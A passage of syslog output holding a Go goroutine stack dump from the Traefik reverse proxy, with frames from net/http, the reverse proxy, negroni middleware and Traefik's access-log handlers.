jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461125 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461245 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).backgroundread( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:668 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*connreader).startbackgroundread
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:664 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461249 [runnable]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 3764102 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4447395 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 3145308 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:764 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1855 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461273 [select]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4455866 [select, 1 minutes]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4458299 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4436153 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445990 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4437768 [runnable]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).readslice( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:341 +
jun 29 15:17:29 [localhost] traefik: net/http/internal.readchunkline( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/internal/chunked.go:122 +
jun 29 15:17:29 [localhost] traefik: net/http/internal.(*chunkedreader).beginchunk( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/internal/chunked.go:48 +
jun 29 15:17:29 [localhost] traefik: net/http/internal.(*chunkedreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/internal/chunked.go:93 +
jun 29 15:17:29 [localhost] traefik: net/http.(*body).readlocked( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transfer.go:778 +
jun 29 15:17:29 [localhost] traefik: net/http.(*body).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transfer.go:770 +
jun 29 15:17:29 [localhost] traefik: net/http.(*bodyeofsignal).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2187 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).copybuffer( , , , , , , , , , , ...)
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:295 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).copyresponse( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:283 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:237 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461232 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).backgroundread( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:668 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*connreader).startbackgroundread
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:664 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445991 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4454855 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4435387 [runnable]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).redactheaders( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:268 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).logtheroundtrip( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:256 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:165 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
